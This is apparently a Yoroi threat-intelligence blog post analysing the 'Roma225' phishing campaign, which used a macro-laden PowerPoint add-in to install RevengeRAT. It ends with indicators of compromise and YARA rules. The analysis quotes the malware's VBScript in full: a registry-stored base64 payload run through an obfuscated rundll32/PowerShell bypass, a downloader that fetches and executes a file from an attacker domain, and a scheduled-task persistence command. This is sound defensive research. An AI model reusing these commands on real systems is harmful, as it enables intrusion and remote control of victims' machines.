# Reference for threat actor for "Aggah"

**Title**: The Enigmatic “Roma225” Campaign - Yoroi

**Source**: https://yoroi.company/research/the-enigmatic-roma225-campaign/

## Content







The Enigmatic “Roma225” Campaign - Yoroi










































































 












Home






Defence center






Threat intelligence






Solutions







Before Attack







Technologies







Threat intelligence






DNS Defence






Kanwa






Genku






Digital Surveillance








Services







Infrastructure & Systems compliance






Scam Protection






SCADA Security






Early Warning






Wi-Fi Infrastructure Assessment






Vulnerability Assessment






Adversarial Simulation






Threat Hunting






SIEM management






Security Infrastructure Assessment (SIA)






Penetration Testing










During Attack







Technologies







Threat intelligence






Kanwa






Yomi






Email Protection








Services







IRT (Incident Response Team)






Managed Advanced Threat Protection






KickBack Attack










After Attack







Technologies







Threat intelligence






Kanwa








Services







Wi-Fi Infrastructure Assessment






Threat Hunting












Blogs







Yoroi Blog






Marco Ramilli Blog








Downloads






About us






Contacts






English







Italiano






The Enigmatic “Roma225” Campaign
	12/27/2018
Introduction
The Cybaze-Yoroi ZLab researchers investigated a recent espionage malware implant weaponized to target companies in the Italian automotive sector. The malware was spread through well written phishing email trying to impersonate a senior partner of one of the major Brazilian business law firms: “Veirano Advogados”.
The malicious email intercepted during the CSDC operations contains a PowerPoint add-in document (“.ppa” extension),  armed with auto-open VBA macro code.
Figure 1. Popup displayed at the .ppa file opening  
Technical analysis
The macro code in the .ppa file contains a simple instruction invoking the “mshta.exe” tool to download and execute the next-stage of the dropper retrieved from “hxxps://minhacasaminhavidacdt.blogspot[.com/”.
Figure 2. Macro extracted from .ppa document 
The Blogspot hosted web page downloaded by mshta.exe appears innocent-looking  to a quick skim through: opening it into the browser shows a perfectly rendered work-in progress blog page.
Figure 3. Home page of the Blogger drop url 
But a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.
Figure 4. Visual Basic Script hidden behind the web page 
It’s funny to see the malware author tried to attribute the paternity of the script to “Microsoft Corp.”, adding pieces of comments belonging to legit Microsoft utilities:
'Update--------------------------------------------------------------------------------------------- ' Copyright: Microsoft Corp. ' ' This script is designed to be used only for scheduled tasks(s). ' There is no extensive error check, and will not dump the output from the Powershell CmdLet. ' ' Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}
These comments are in fact part of the “SyncAppvPublishingServer” utility, commonly deployed into Windows 10 machines at “C:\Windows\System32\SyncAppvPublishingServer.vbs”. Anyway, the remaining part of the script is responsible to execute a series of malicious actions:
Store a base64 encoded version of the “RevengeRAT” payload into registry key located at "HKCU\AppEvents\Values"
CreateObject("Wscript.Shell").regwrite "HKCU\AppEvents\Values", "TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]" , "REG_SZ"
Decode and execute of the stored payload
Set A0102030405 = CreateObject("WScript.Shell")
Dim CDT0908087CDT
CDT0908087CDT = "cmd." + "exe /C rundll32." + "exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").run(""cmd." + "exe /c power" + "shell -" + "Execution" + "Policy Bypass -windows" + "tyle hidden -noexit -Command [Reflection." + "Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\AppEvents).Values)).EntryPoint" + ".Invoke($N" + "ull,$" + "Null)"",0,true);" 
A0102030405.run CDT0908087CDT, vbHide
Create and execute another VBScript into  “%AppData%\Local\Temp\Z3j.vbs”, capable to download a new payload from the remote destination “hxxp://cdtmaster.com[.]br”
Set XbonXo = CreateObject("WScript.Shell")
Dim XoowA83AC
XoowA83AC = "c" + "M" + "d /c cd %TEMP% &@echo Z6h = ""h" + "t" + "tp://cdtmaster.com.br/Document." + "mp3"">>Z3j.vbs &@echo M2l = M5t(""R]Qc[S\b<SfS"")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""[af[Z@<f[ZVbb^""))>>Z3j.vbs &@echo M1s.Open M5t(""USb""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""OR]RP<ab`SO[""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs  &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"
XbonXo.Run XoowA83AC, vbHide
Finally, the creation of a new task running again the “mshta.exe” utiliy with the “hxxps://pocasideiascdt.blogspot[.]com/” parameter every two hours. This URL points to web page which actually is a mirror of the  "https://minhacasaminhavidacdt.blogspot[.]com/" one.
Dim OUGo57658586GFFJHG
Set OUGo57658586GFFJHG = CreateObject("WScript.Shell")
asdmmmc= "c" + "Md /c Sc" + "hTa" + "sks /Cre" + "ate /sc MIN" + "UTE /MO 120 /TN OfficeData /TR ""m" + "sh" + "ta." + "exe h" + "ttp" + "s://pocasideiascdt.blogspot.com/"" /F "
OUGo57658586GFFJHG.Run asdmmmc, vbHide
self.close
Figure 5. Scheduled task for persistency
Summing up, the last stages of the infection chain are designed to install a RevengeRAT variant hidden into a regkey and run the “outlook.exe”  executable extracted by the “Document.exe” binary, retrieved from “hxxp://cdtmaster.com[.]br/Document.mp3”.
The following image briefly shows the malware infection chain:
Figure 6. Roma255 infection chain
RevengeRAT Payload
Once executed, the RAT immediately contacts its command and control servers sending victim machine’s information. In the analyzed sample, the author configured two different C2 destinations: "office365update[.]duckdns.org" and "systen32.ddns[.]net".
Figure 7. Configuration of the RevengeRAT
If one of these is down, the malware falls back to the other one. At time of writing, both the remote C2 were down, so it was only possible to emulate the server behavior in order to analyze the information sent by the RAT. 
Anyway, the malware establishes a TCP connection with the server and sends to it the following stream:
Figure 8. RevengeRAT check-in data
At first sight, it’s possible to spot a repeated sequence of chars used as separator between the data fields:
roma225
This string have been chosen by the attacker during the preparation of the malware, using the customization functionalities provided by the RevengeRAT builder. Splitting and decoding the data stream, information becomes clearer:
Figure 9. decoded check-in data
As told before, the C2s were unresponsive at time of writing, however their latest IP resolution indicates the infrastructure of the attacker could be located in different countries.
For instance, the domain “office365update[.]duckdns.org” resolved to the 184.75.209.169 IP addresss, geolocated in Canada.

Moreover,  “systen32.ddns[.]net” resolved to the 138.36.3.228 IP, geolocated in Brazil.

Document.exe

The “Document.exe” file is hosted at “cdtmaster.com[.]br” and is actually downloaded into the victim machine by the “Z3j.vbs” script. This PE32 file is characterized by the Pokemon Megaball image used as program icon and its unique purpose is to deploy and run the “Outlook.exe” payload.
Extracting static PE information from this last sample, reveals references to the “SendBlaster” application, a program used to deliver newsletters. Here, another interesting fact comes up: this product is currently developed by the Italian firm eDisplay Srl, so, in addition to the “roma225” separator, represents another direct reference to the Italian landscape.
Figure 10. Outlook.exe static information 
When the “Outlook.exe” payload is executed, it remains apparently quiet: no outgoing network traffic or file system modifications; however it binds a listening TCP socket on localhost: "tcp://127.0.0.1:49356".  
Cybaze-Yoroi ZLab researchers are still dissecting the Outlook.exe sample to extract its real behavior.
Conclusions
After this first analysis, it's difficult to attribute the attack to a specific threat actor. In the past, RevengeRAT variants were also used by APT groups such as The Gorgon Group, the enigmatic threat actor tracked by the Unit42 researchers, author of cyber espionage campaigns against UK, Spain, Russia and US governmental organization. However, the source code of the RAT has been publicly leaked few years ago and could be actually part of a multitude of cyber arsenals, more or less sophisticated. 
Anyway, there are TTP in common with Unit42 report, such as the usage of shared infrastructure (in the specific case the Blogger service) as drop-server and other popular RAT as final backdoor (i.e. njRAT).  
In fact, the “cdtmaster.com.]br” hosts other suspicious files such as the “nj.mp3” binary, which actually is a njRAT variant. All the other files are still under investigation.
Figure 11. Malware hosted on ctdmaster.com[.br

Indicator Of Compromise
Dropurl:hxxps://minhacasaminhavidacdt.blogspot[.]comhxxps://pocasideiascdt.blogspot[.]com/hxxp://cdtmaster.]com.br177.85.98.242C2 (RevengeRAT):office365update[.]duckdns.org184.75.209.169systen32.ddns[.]net138.36.3.228Persistency:HKCU\AppEvents\<”Values”>Hash:4211e091dfb33523d675d273bdc109ddecf4ee1c1f5f29e8c82b9d0344dbb6a1e8a765ec824881e1e78defd7c011da735f3e3b954aaf93a4282b6455a1b9afcc702e5cc9462e464c8c29c832fe0d1ecd5cd7740cc2cbceecfd70e566da8194a1
Yara Rules
rule Rooming_List_Advogados_e_Seguranca_21_12_2018{

	meta:
  	description = "Yara Rule for revengeRAT_roma225"
  	author = "Cybaze Zlab_Yoroi"
  	last_updated = "2018-12-21"
  	tlp = "white"
  	category = "informational"

	strings:
    		$a1 = {56 00 42 00 41}
    		$a2 = {4D F3 64 75 6C 6F 31}
    		$a3 = {4D 73 68 74 61}
    		$b = "Auto_Open"
    		$c = "Shell"
    		$d = "https://minhacasaminhavidacdt.blogspot.com"
    		$e = {D0 CF 11 E0 A1 B1 1A E1}

	condition:
    	$b and $c and $d and $e and 1 of ($a*)
}

rule revengeRAT_21_12_2018{

	meta:
  	description = "Yara Rule for revengeRAT_roma225"
  	author = "Cybaze Zlab_Yoroi"
  	last_updated = "2018-12-21"
  	tlp = "white"
  	category = "informational"

	strings:
    		$a1 = "FromBase64String"
    		$a2 = {17 00 38 72 1F 00 00 20 D7 ?? ?? ?? 20 47}
    		$b = {4D 5A}
    		$c = {65 5A 33 78 63 6B 4A 39 4B 51 47 4B 50 36 33 55 37 39 67}
   		$d = "RevengeFUD0000000.exe"
    		$e = "7ec6b2a4-a8e7"

	condition:
    	$b and $c and $d and $e and 1 of ($a*)

}


rule Outlook_exe_21_12_2018{

	meta:
  	description = "Yara Rule for revengeRAT_roma225"
  	author = "Cybaze Zlab_Yoroi"
  	last_updated = "2018-12-21"
  	tlp = "white"
  	category = "informational"

	strings:
    		$a1 = "Dispose"
    		$a2 = {53 00 65 00 6E 00 64 00 42 00 6C 00 61 00 73 00 74 00 65 00 72}
    		$b = {4D 5A}
    		$c = {49 4D 4E 64 48 49 37 49 34 69 57 37 46 6E 73 6F 49 38}
    		$d = "ScreenBooking4"
    		$e = "capturaTela"

	condition:
    	$b and $c and $d and $e and 1 of ($a*)

}

rule Document_exe_21_12_2018{

	meta:
  	description = "Yara Rule for revengeRAT_roma225"
  	author = "Cybaze Zlab_Yoroi"
  	last_updated = "2018-12-21"
  	tlp = "white"
  	category = "informational"

	strings:
    		$a1 = "Dispose"
    		$a2 = {F5 38 7E 26 EA 99}
   		$b = {4D 5A}
    		$c = {6C 38 6E 78 4A 79 30 6E 34 616D 4A 74 4F 67 00 57}
    		$d = "4System"
    		$e = {53 6B 79 70 65 20 54 65 63 68 6E 6F 6C 6F 67 69 65 73}

	condition:
    	$b and $c and $d and $e and 1 of ($a*)
}

This blog post was authored by Testa Davide, Antonio Farina,  Luca Mella, Antonio Pirozzi of Cybaze-Yoroi Z-LAB 
SeatYoroi S.r.l.Piazza Sallustio, 900187 Roma (RM)Contact[email protected]+39 051 0301005LegalTerms & ConditionsMOG D.Lgs 231/01Privacy PolicyCookie PolicyCode of Ethics andConductWarning systemSubscribe to our early warning systemDownloadsNewsSocialP.IVA. 03407741200 - R.E.A. RM 1559639 - Codice Fiscale 03407741200 - Capitale Sociale: Euro 100.000 IVYoroi S.r.l. società soggetta ad attività di direzione e coordinamento esercitata dalla Tinexta S.p.A.credits: SimpleNetworks
 
×Subscribe to our early warning system

 











Name *




Last Name *




Company *




Email *




Details






Dichiaro di aver letto e compreso l’informativa privacy resa ai sensi dell’art. 13 e autorizzo il Titolare del trattamento alla raccolta dei miei dati personali secondo le modalità e per le finalità ivi descritte.






Autorizzo il Titolare del trattamento alla raccolta dei miei dati personali secondo le modalità descritte nell’informativa privacy per l’invio di comunicazioni commerciali e/o promozionali anche tramite l’invio di newsletter














 


Questo sito, come la maggior parte dei siti web, utilizza cookie, anche di terze parti, per migliorare la tua esperienza di navigazione e raccogliere informazioni sull'utilizzo del sito stesso. Cliccando su "Accetta tutti" ti dichiari d'accordo all'utilizzo di cookie analitici (che ci aiutano a capire in che modo gli utenti usano il sito e come migliorarlo, insieme ai nostri servizi) e di tracciamento (inclusi quelli di nostri partner di fiducia) che ci aiutano a decidere quali prodotti mostrarti, a misurare il volume di visite sul nostro sito e a darti la possibilità di mettere "mi piace" e di condividere contenuti direttamente sui social media. Clicca qui per vedere a cosa hai dato il tuo consenso e trovare più informazioni sui cookie che utilizziamo.Read MoreGestisci ImpostazioniRifiuta TuttiAccetta tutti  Manage consent




Close






Privacy Overview 
Questo sito, come la maggior parte dei siti web, utilizza cookie, anche di terze parti, per migliorare la tua esperienza di navigazione e raccogliere informazioni sull'utilizzo del sito stesso.

 





								Necessary							


Necessary

Always Enabled




									I cookie funzionali contribuiscono al buon funzionamento del nostro sito e ti permettono di creare un account, accedere e gestire le tue prenotazioni. Questi cookie ricordano la lingua e la valuta che hai selezionato, le tue ricerche passate e altre preferenze. Si tratta di cookie tecnici che devono essere attivati per poter utilizzare il nostro sito e i nostri servizi.
CookieDurationDescription_GRECAPTCHA5 months 27 daysThis cookie is set by the Google recaptcha service to identify bots to protect the website against malicious spam attacks.cookielawinfo-checkbox-advertisement1 yearSet by the GDPR Cookie Consent plugin, this cookie is used to record the user consent for the cookies in the "Advertisement" category .cookielawinfo-checkbox-analytics11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Analytics".cookielawinfo-checkbox-functional11 monthsThe cookie is set by GDPR cookie consent to record the user consent for the cookies in the category "Functional".cookielawinfo-checkbox-necessary11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookies is used to store the user consent for the cookies in the category "Necessary".cookielawinfo-checkbox-others11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Other.cookielawinfo-checkbox-performance11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Performance".pll_language1 yearThe pll _language cookie is used by Polylang to remember the language selected by the user when returning to the website, and also to get the language information when not available in another way.viewed_cookie_policy11 monthsThe cookie is set by the GDPR Cookie Consent plugin and is used to store whether or not user has consented to the use of cookies. It does not store any personal data. 






								Performance							


Performance





									Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.
								






								Marketing							


Marketing





									Questo sito e i nostri partner di fiducia usano cookie di terze parti per mostrare messaggi pubblicitari personalizzati su questo sito e su altri siti in base alla tua cronologia di navigazione. Questi cookie vengono usati per integrare i social media sul nostro sito, in modo che tu possa mettere "mi piace" sulle nostre pagine o sui nostri prodotti e condividerli sui social.
CookieDurationDescriptionVISITOR_INFO1_LIVE5 months 27 daysA cookie set by YouTube to measure bandwidth that determines whether the user gets the new or old player interface.YSCsessionYSC cookie is set by Youtube and is used to track the views of embedded videos on Youtube pages.yt-remote-connected-devicesneverYouTube sets this cookie to store the video preferences of the user using embedded YouTube video.yt-remote-device-idneverYouTube sets this cookie to store the video preferences of the user using embedded YouTube video.yt.innertube::nextIdneverThis cookie, set by YouTube, registers a unique ID to store data on what videos from YouTube the user has seen.yt.innertube::requestsneverThis cookie, set by YouTube, registers a unique ID to store data on what videos from YouTube the user has seen. 






								Others							


Others





									Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.
								






								Analytics							


Analytics





									I cookie analitici ci aiutano a capire in che modo i clienti come te utilizzano questo sito. In questo modo possiamo migliorare il sito, le app e le comunicazioni e assicurarci di offrire sempre contenuti interessanti e rilevanti.
CookieDurationDescription_gat_gtag_UA_209986505_11 minuteSet by Google to distinguish users.CONSENT2 yearsYouTube sets this cookie via embedded youtube-videos and registers anonymous statistical data. 












SAVE & ACCEPT


Powered by 





















        mobile-menu-eng 


Home







Defence center







Threat intelligence







Solutions



     Solutions  


Before Attack



     Before Attack  


Technologies



     Technologies  


Threat intelligence







DNS Defence







Kanwa







Genku







Digital Surveillance




 Back 



Services



     Services  


Infrastructure & Systems compliance







Scam Protection







SCADA Security







Early Warning







Wi-Fi Infrastructure Assessment







Vulnerability Assessment







Adversarial Simulation







Threat Hunting







SIEM management







Security Infrastructure Assessment (SIA)







Penetration Testing




 Back 
 Back 



During Attack



     During Attack  


Technologies



     Technologies  


Threat intelligence







Kanwa







Yomi







Email Protection




 Back 



Services



     Services  


IRT (Incident Response Team)







Managed Advanced Threat Protection







KickBack Attack




 Back 
 Back 



After Attack



     After Attack  


Technologies



     Technologies  


Threat intelligence







Kanwa




 Back 



Services



     Services  


Wi-Fi Infrastructure Assessment







Threat Hunting




 Back 
 Back 
 Back 



Blogs



     Blogs  


Yoroi Blog







Marco Ramilli Blog




 Back 



Downloads







About us







Contacts







English



     English  


Italiano




 Back 
© 2020 credits: SimpleNetworks     menu-it 


Defence center







Solutions



    Back   Solutions  


Before Attack



    Back   Before Attack  


Technologies



    Back   Technologies  


Threat intelligence







DNS Defence







Kanwa







Genku







Digital Surveillance








Services



    Back   Services  


Infrastructure & Systems compliance







Scam Protection







SCADA Security







Early Warning







Wi-Fi Infrastructure Assessment







Vulnerability Assessment







Adversarial Simulation







Threat Hunting







SIEM management







Security Infrastructure Assessment (SIA)







Penetration Testing









During Attack



    Back   During Attack  


Technologies



    Back   Technologies  


Threat intelligence







Kanwa







Yomi







Email Protection








Services



    Back   Services  


IRT (Incident Response Team)







Managed Advanced Threat Protection







KickBack Attack









After Attack



    Back   After Attack  


Technologies



    Back   Technologies  


Threat intelligence







Kanwa








Services



    Back   Services  


Wi-Fi Infrastructure Assessment







Threat Hunting










Blogs



    Back   Blogs  


Yoroi Blog







Marco Ramilli Blog








Home







Downloads







About us









linkedin





facebook



pinterest



youtube



rss



twitter



instagram





facebook-blank



rss-blank



linkedin-blank



pinterest



youtube



twitter



instagram




































